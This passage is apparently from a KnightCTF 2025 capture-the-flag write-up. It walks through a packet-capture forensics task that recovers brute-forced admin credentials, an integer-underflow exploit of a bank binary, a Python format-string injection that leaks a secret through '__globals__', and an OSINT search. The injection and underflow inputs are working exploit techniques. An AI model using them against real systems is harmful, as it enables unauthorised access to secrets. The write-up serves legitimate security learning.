192.168.1.9 shows one packet with the details:\n171000\t623.001452577\t192.168.1.3\t192.168.1.10\tHTTP\t128\tPOST /admin/blog/delete/3 HTTP/1.1 (application/x-www-form-urlencoded)\nFlag: KCTF{192.168.1.3}\nCompromising the Admin\rDescription: The attacker managed to compromise the admin\u0026rsquo;s credentials. Identify the admin\u0026rsquo;s email and password.\nAuthor: TareqAhamed (0xt4req)\nSince we know that the attacker is trying to brute force the /admin/login page with POST requests, I decide to filter the packets using this information:\nhttp.request.method == POST \u0026amp;\u0026amp; ip.addr == 192.168.1.10 \u0026amp;\u0026amp; ip.addr == 192.168.1.9 \u0026amp;\u0026amp; http.request.uri == \u0026quot;/admin/login\u0026quot;\nI decide to use the information from the last packet since this would mean that either the attacker\u0026rsquo;s brute force ended unsuccessfully or they were able to get the right credentials.\n1 2 3 4 HTML Form URL Encoded: application/x-www-form-urlencoded Form item: \u0026#34;_token\u0026#34; = \u0026#34;lj41L7Wk6N6hZd7K5twHMghHSkruvwzX3JcV5GLj\u0026#34; Form item: \u0026#34;email\u0026#34; = \u0026#34;admin@example.com\u0026#34; Form item: \u0026#34;password\u0026#34; = \u0026#34;password\u0026#34; Flag: KCTF{admin@example.com_password}\nPWN\rKnight\u0026rsquo;s Bank\rDescription: In the heart of the ancient kingdom lies the Knight Bank, a fortress of wealth guarded by its intricate magical arithmetic. Only the most cunning warriors who understand the secret vulnerabilities of numbers can uncover the hidden treasure buried deep within its vaults.\nAuthor: NomanProdhan\nFor this challenge, we are given given an IP address and port to establish a netcat connection with (which I forgot to note down). We are also given a knight_bank file, which is being run when we establish the netcat connection. Running the file gives:\nOpening the file in Ghidra, there are two interesting functions main and win_prize. main has the following logic:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 undefined8 main(void) { int iVar1; undefined8 uVar2; uint local_10; uint local_c; local_c = 1000; puts(\u0026#34;Welcome to the Knight Bank!\u0026#34;); fflush(stdout); printf(\u0026#34;Your current balance is: %u\\n\u0026#34;,(ulong)local_c); fflush(stdout); printf(\u0026#34;Enter the amount you want to withdraw: \u0026#34;); fflush(stdout); iVar1 = __isoc99_scanf(\u0026amp;DAT_004020a0,\u0026amp;local_10); if (iVar1 == 1) { if (local_10 \u0026lt; 0xf4241) { local_c = local_c - local_10; printf(\u0026#34;You withdrew %u. Your new balance is %u.\\n\u0026#34;,(ulong)local_10,(ulong)local_c); fflush(stdout); if (local_c \u0026lt; 0xf4241) { puts(\u0026#34;Better luck next time!\u0026#34;); fflush(stdout); } else { win_prize(); } uVar2 = 0; } else { puts(\u0026#34;Error: You cannot withdraw more than 1,000,000 at a time.\u0026#34;); fflush(stdout); uVar2 = 1; } } else { puts(\u0026#34;Invalid input. Exiting.\u0026#34;); fflush(stdout); uVar2 = 1; } return uVar2; } win_prize function:\n1 2 3 4 5 6 7 void win_prize(void) { puts(\u0026#34;Congratulations! You win the prize!\u0026#34;); fflush(stdout); system(\u0026#34;cat flag.txt\u0026#34;); return; } Given this information, we need to trigger the else statement that calls win_prize. After subtracting the users\u0026rsquo; input (which has to be less than 1,000,000 given the hex value 0xf4241) from the balance, the program checks if the result is less than 1,000,000. If it isn\u0026rsquo;t then we get the flag.\nI decided in input 10,000 since it was larger than 1000 and less than 1,000,000. Since local_c is a 32-bit unsigned integer, this would cause the subtraction to wrap around when it goes below 0. This gave the flag, however I forgot to note the flag down, so here is the output on my local machine:\n1 2 3 4 5 6 Welcome to the Knight Bank! Your current balance is: 1000 Enter the amount you want to withdraw: 10000 You withdrew 10000. Your new balance is 4294958296. Congratulations! You win the prize! cat: flag.txt: No such file or directory Knight\u0026rsquo;s Secret\rDescription: Exploit \u0026amp; get the flag.\nConnection Info: nc 45.56.68.122 1337\nAuthor: NomanProdhan\nWe aren\u0026rsquo;t given any files for this challenge. Connecting to the server we can see this:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 $ nc 45.56.68.122 1337 ================================================== Welcome to the Knight\u0026#39;s Secret! The castle\u0026#39;s vault holds a secret key, protected within the CONFIG dictionary. You are a knight tasked with proving the strength of the vault\u0026#39;s defenses. To succeed, you must craft an input to reveal the hidden key within the system. You will be provided with a user object representing a knight, with attributes \u0026#39;name\u0026#39; and \u0026#39;role\u0026#39;. Once you discover the key, input it again to receive the banner of victory. Example of a safe template: \u0026#39;Greetings, {person_obj.name}, the {person_obj.role}.\u0026#39; Type \u0026#39;hint\u0026#39; if you need guidance or \u0026#39;exit\u0026#39; to withdraw from the quest. ================================================== Enter your secret: Entering the safe template given shows:\n1 2 Enter your secret: Greetings, {person_obj.name}, the {person_obj.role} Output: Greetings, Brave Knight, the Defender of the Realm After much trail and error I was able to figure out that the program running on the server would only taken in objects as input. So using this, we need to get the CONFIG library. Using {person_obj.__class__.__init__.__globals__} we can see the following:\n1 2 Enter your secret: {person_obj.__class__.__init__.__globals__} Output: {\u0026#39;__name__\u0026#39;: \u0026#39;__main__\u0026#39;, \u0026#39;__doc__\u0026#39;: None, \u0026#39;__package__\u0026#39;: None, \u0026#39;__loader__\u0026#39;: \u0026lt;_frozen_importlib_external.SourceFileLoader object at 0x72e3aa43b920\u0026gt;, \u0026#39;__spec__\u0026#39;: None, \u0026#39;__annotations__\u0026#39;: {}, \u0026#39;__builtins__\u0026#39;: \u0026lt;module \u0026#39;builtins\u0026#39; (built-in)\u0026gt;, \u0026#39;__file__\u0026#39;: \u0026#39;/challenge/challenge.py\u0026#39;, \u0026#39;__cached__\u0026#39;: None, \u0026#39;CONFIG\u0026#39;: {\u0026#39;KEY\u0026#39;: \u0026#39;_KNIGHTSECRET2025_\u0026#39;}, \u0026#39;Person\u0026#39;: \u0026lt;class \u0026#39;__main__.Person\u0026#39;\u0026gt;, \u0026#39;fun\u0026#39;: \u0026lt;function fun at 0x72e3aa422340\u0026gt;, \u0026#39;main\u0026#39;: \u0026lt;function main at 0x72e3aa200d60\u0026gt;} The key _KNIGHTSECRET2025_ has the flag. Entering {person_obj.__class__.__init__.__globals__[CONFIG][KEY]} gives:\n1 2 3 4 5 6 Enter your secret: {person_obj.__class__.__init__.__globals__[CONFIG]} Output: {\u0026#39;KEY\u0026#39;: \u0026#39;_KNIGHTSECRET2025_\u0026#39;} Enter your secret: {person_obj.__class__.__init__.__globals__[CONFIG][KEY]} Congratulations, noble knight! You have unveiled the vault\u0026#39;s secret. Here is your banner of victory: KCTF{_c0ngRaT5_Kn1GHT_Y0U_g07_THE_secreT_} Flag: KCTF{_c0ngRaT5_Kn1GHT_Y0U_g07_THE_secreT_}\nOSINT\rThe Hidden Quest\rDescription: The journey begins even before the battle starts! \nIn the world of knights and hackers, not everything is as it seems. Somewhere in our recent posts, a secret lies hidden, waiting to be discovered. \nLook closer, think sharper, and let your curiosity guide you. The answer is out there  will you find it? \nAuthor: NomanProdhan\nGiven the challenge description, I decide to find all the different social media accounts of Knight Squad. Going to their website, we can see at the bottom of their page that they have a Facebook, Twitter and Youtube account. I decide to start with their Facebook account. They have made several posts this year so I decide to go through them all. On one of the posts I see that one of the hashtags is #Flag. I double check this by looking at the tags for the other posts and this post is the only one that has it. After looking at the image, I saw the flag in the top left. The post is here.\nFlag: KCTF{w0W_y0U_G07_m3_}\nThank You\rIf you\u0026rsquo;ve made it this far, I hope you\u0026rsquo;ve enjoyed this writeup and thank you for reading it! Thanks again to the Knight Squad for organising this CTF.\n","date":"2025-01-22T14:00:00+11:00","image":"http://localhost:1313/p/knightctf-2025/cover_hu7351940104379622244.png","permalink":"http://localhost:1313/p/knightctf-2025/","title":"KnightCTF 2025 Writeup"}]